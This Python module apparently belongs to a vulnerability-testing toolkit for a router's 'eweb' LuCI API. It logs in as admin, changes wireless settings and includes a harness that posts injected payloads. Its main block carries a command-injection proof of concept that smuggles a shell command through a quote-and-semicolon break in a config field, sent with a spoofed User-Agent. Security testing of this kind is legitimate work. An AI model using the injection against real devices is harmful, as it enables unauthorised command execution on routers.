import threading
import time

from fake_useragent import UserAgent

from modules.encryption.eweb_password import encrypt_pass
from modules.http_api import http_post

p_lock = threading.Lock()


def eweb_inject_cmd(params):
    while 'sid' not in params['eweb'] or params['eweb']['sid'] is None:
        params = eweb_get_sid(params=params)
    sid = params['eweb']['sid']
    p_lock.acquire()
    api = params['wvt']['injected_api']
    del params['wvt']['injected_api']
    params['http'].__setitem__(
        'url', 'http://{}{}'.format(params['eweb']['ip'], api))
    params['http'].__setitem__('params', {'auth': sid})
    injected_cmd = params['wvt']['injected_cmd']
    inject_method = params['wvt']['inject_method']
    del params['wvt']['injected_cmd']
    del params['wvt']['inject_method']
    p_lock.release()
    params['http'].__setitem__(
        'data', {'params': injected_cmd, 'method': inject_method})
    params['http'].__setitem__(
        'headers', {'Content-Type': 'application/json', 'User-Agent': get_fake_ua()})
    params['http'].__setitem__('timeout', 10.0)
    try:
        params = http_post(params=params)
        print('对接口{}的{}方法注入{}请求完成'.format(api, inject_method, injected_cmd))
    except Exception as e:
        params['http']['response'] = e
        print('对接口{}的{}方法注入{}发生错误{}'.format(
            api, inject_method, injected_cmd, repr(e)))
        params['wvt']['inject_error'] = True
    return params


def eweb_get_sid(params):
    if 'timestamp' in params['eweb']:
        timestamp = str(params['eweb']['timestamp'])
        del params['eweb']['timestamp']
    else:
        timestamp = str(get_timestamp_now(is_millisecond=False))
    if 'http' not in params.keys():
        params['http'] = {}
    params['http'].__setitem__(
        'url', 'http://{}/cgi-bin/luci/api/auth'.format(params['eweb']['ip']))
    params['http'].__setitem__('params', {})
    params['http'].__setitem__(
        'data', {
            'params': {
                'username': 'admin',
                'encry': True,
                'password': encrypt_pass(message=params['eweb']['pass']),
                'time': timestamp
            }, 'method': 'login'
        }
    )
    params['http'].__setitem__(
        'headers',
        {
            'Content-Type': 'application/json',
            'User-Agent': get_fake_ua()
        }
    )
    params = http_post(params=params)
    if params['http']['response'] is not int:
        if params['http']['response']['data'] is not None:
            sid = params['http']['response']['data']['sid']
        else:
            sid = None
    else:
        sid = None
    del params['http']['response']
    params['eweb'].__setitem__('sid', sid)
    return params


def eweb_get_wireless_config(params):
    data = {
        "method": "acConfig.get",
        "params": {"module": "wireless", "noParse": False, "async": None, "remoteIp": False, "device": "pc"}
    }
    params['http'] = {
        'url': 'http://{}/cgi-bin/luci/api/cmd'.format(params['eweb']['ip']),
        'data': data,
        'params': {'auth': params['eweb']['sid']},
        'headers': {"Content-Type": "application/json", "User-Agent": get_fake_ua()}
    }
    params = http_post(params=params)
    return params


def eweb_set_wireless_config(params):
    new_config = params['eweb']['new_config']
    del params['eweb']['new_config']
    data = {
        "method": "acConfig.set",
        "params": {
            "module": "wireless",
            "data": new_config,
            "noParse": False,
            "async": None,
            "remoteIp": False,
            "device": "pc"
        }
    }
    params['http'] = {
        'url': 'http://{}/cgi-bin/luci/api/cmd'.format(params['eweb']['ip']),
        'data': data,
        'params': {'auth': params['eweb']['sid']},
        'headers': {"Content-Type": "application/json", "User-Agent": get_fake_ua()}
    }
    params = http_post(params=params)
    return params


def eweb_set_wireless_ssid(params):
    """
        修改ssid和密码
    """
    assert 'sid' in params['eweb'].keys()
    params = eweb_get_wireless_config(params)
    new_config = params['http']['response']['data']
    del params['http']['response']

    new_pass = params['eweb']['new_pass']
    del params['eweb']['new_pass']
    for index, item in enumerate(new_config["ssidList"]):
        if index == 0 and 'new_ssid' in params['eweb']:
            new_ssid = params['eweb']['new_ssid']
            del params['eweb']['new_ssid']
            new_config["ssidList"][index]["ssidName"] = new_ssid
            new_config["ssidList"][index]["password"] = new_pass
        elif index == 1 and 'new_ssid_5g' in params['eweb']:
            new_ssid_5g = params['eweb']['new_ssid_5g']
            del params['eweb']['new_ssid_5g']
            new_config["ssidList"][index]["ssidName"] = new_ssid_5g
            new_config["ssidList"][index]["password"] = new_pass

    params['eweb']['new_config'] = new_config
    params = eweb_set_wireless_config(params)
    return params


def eweb_set_wireless_bandwidth(params):
    """
        修改频宽
    """
    assert 'sid' in params['eweb'].keys()
    params = eweb_get_wireless_config(params)
    new_config = params['http']['response']['data']
    del params['http']['response']

    for index, item in enumerate(new_config["radioList"]):
        if item["type"] == "2.4G" and 'new_bandwidth' in params['eweb'].keys():
            new_bandwidth = params['eweb']['new_bandwidth']
            del params['eweb']['new_bandwidth']
            new_config["radioList"][index]["bandWidth"] = str(new_bandwidth)
        elif item["type"] == "5G" and 'new_bandwidth_5g' in params['eweb'].keys():
            new_bandwidth_5g = params['eweb']['new_bandwidth_5g']
            del params['eweb']['new_bandwidth_5g']
            new_config["radioList"][index]["bandWidth"] = str(new_bandwidth_5g)

    params['eweb']['new_config'] = new_config
    params = eweb_set_wireless_config(params)
    return params


def eweb_get_radio_config(params):
    data = {
        "method": "devConfig.get",
        "params": {"module": "radio", "noParse": False, "async": None, "remoteIp": False, "device": "pc"}
    }
    params['http'] = {
        'url': 'http://{}/cgi-bin/luci/api/cmd'.format(params['eweb']['ip']),
        'data': data,
        'params': {'auth': params['eweb']['sid']},
        'headers': {"Content-Type": "application/json", "User-Agent": get_fake_ua()}
    }
    params = http_post(params=params)
    return params


def eweb_set_radio_config(params):
    new_config = params['eweb']['new_config']
    del params['eweb']['new_config']
    data = {
        "method": "devConfig.set",
        "params": {
            "module": "radio",
            "data": new_config,
            "noParse": False,
            "async": None,
            "remoteIp": False,
            "device": "pc"
        }
    }
    params['http'] = {
        'url': 'http://{}/cgi-bin/luci/api/cmd'.format(params['eweb']['ip']),
        'data': data,
        'params': {'auth': params['eweb']['sid']},
        'headers': {"Content-Type": "application/json", "User-Agent": get_fake_ua()}
    }
    params = http_post(params=params)
    return params


def eweb_set_radio_channel(params):
    """
        修改信道
    """
    assert 'sid' in params['eweb'].keys()
    params = eweb_get_radio_config(params)
    new_config = params['http']['response']['data']
    del params['http']['response']

    for index, item in enumerate(new_config["radioList"]):
        if item["type"] == "2.4G" and 'channel' in params['eweb'].keys():
            channel = params['eweb']['channel']
            del params['eweb']['channel']
            new_config["radioList"][index]["channel"] = str(channel)
        elif item["type"] == "5G" and 'channel_5g' in params['eweb'].keys():
            channel_5g = params['eweb']['channel_5g']
            del params['eweb']['channel_5g']
            new_config["radioList"][index]["channel"] = str(channel_5g)

    params['eweb']['new_config'] = new_config
    params = eweb_set_radio_config(params)
    return params


def eweb_set_radio_txpower(params):
    """
        修改功率
    """
    assert 'sid' in params['eweb'].keys()
    params = eweb_get_radio_config(params)
    new_config = params['http']['response']['data']
    del params['http']['response']

    for index, item in enumerate(new_config["radioList"]):
        if item["type"] == "2.4G" and 'txpower' in params['eweb'].keys():
            txpower = params['eweb']['txpower']
            del params['eweb']['txpower']
            new_config["radioList"][index]["txpower"] = str(txpower)
        elif item["type"] == "5G" and 'txpower_5g' in params['eweb'].keys():
            txpower_5g = params['eweb']['txpower_5g']
            del params['eweb']['txpower_5g']
            new_config["radioList"][index]["txpower"] = str(txpower_5g)

    params['eweb']['new_config'] = new_config
    params = eweb_set_radio_config(params)
    return params


def get_timestamp_now(is_millisecond=True):
    timestamp = time.time()
    if is_millisecond:
        return int(round(timestamp * 1000))
    return int(timestamp)


def get_fake_ua(random_ua=False):
    """
    伪造User-Agent
    概率出现报错，可以无视
    """
    if random_ua:
        ua = UserAgent()
        return ua.random
    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 " \
           "Safari/537.36"


if __name__ == '__main__':
    injected_cmd_ = {
        'device': 'pc',
        'params': [
            {
                'params': {
                    'noParse': False,
                    'data': {
                        'start': u"ca_get_ip_range';touch /root/66;'"
                    },
                    'remoteIp': False,
                    'module': 'kvNavDev',
                    'async': None
                },
                'method': 'devConfig.set'
            }
        ]
    }
    inject_method_ = 'cmdArr'
    params_ = {
        'http': {},
        'eweb': {
            'ip': '10.51.132.29',
            'pass': '11111111'
        },
        'wvt': {
            'injected_api': '/cgi-bin/luci/api/cmd',
            'injected_cmd': injected_cmd_,
            'inject_method': inject_method_
        }
    }
    params_ = eweb_inject_cmd(params=params_)
    print('Done')
